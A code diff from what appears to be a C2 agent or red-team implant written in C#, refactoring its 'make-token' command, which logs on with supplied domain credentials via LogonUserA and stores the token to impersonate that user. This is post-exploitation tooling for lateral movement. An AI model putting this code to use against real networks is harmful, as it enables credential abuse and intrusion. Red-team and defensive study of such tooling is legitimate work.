@@ -3,23 +3,26 @@ using Agent.Helpers;
 using Agent.Models;
 using System;
 using System.Security.Principal;
+using System.Threading.Tasks;
+using System.Threading;
 using WinAPI.Data.AdvApi;
 using WinAPI.PInvoke;
+using Shared;
 
 namespace Commands
 {
     public class MakeTokenCommand : AgentCommand
     {
-        public override string Name => "make-token";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.MakeToken;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            // make-token DOMAIN\Username Password
-            var userDomain = task.SplittedArgs[0];
-            var password = task.SplittedArgs[1];
+            task.ThrowIfParameterMissing(ParameterId.User);
+            task.ThrowIfParameterMissing(ParameterId.Password);
+            task.ThrowIfParameterMissing(ParameterId.Domain);
 
-            var split = userDomain.Split('\\');
-            var domain = split[0];
-            var username = split[1];
+            var domain = task.GetParameter<string>(ParameterId.Domain);
+            var password = task.GetParameter<string>(ParameterId.Password);
+            var username = task.GetParameter<string>(ParameterId.User);
 
             IntPtr hToken = IntPtr.Zero;
             if (Advapi.LogonUserA(username, domain, password, LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
@@ -28,7 +31,7 @@ namespace Commands
                 {
                     var identity = new WindowsIdentity(hToken);
                     context.AppendResult($"Successfully impersonated {identity.Name}");
-                    ImpersonationHelper.Impersonate(hToken);
+                    context.Agent.ImpersonationToken = hToken;
                     return;
                 }
 
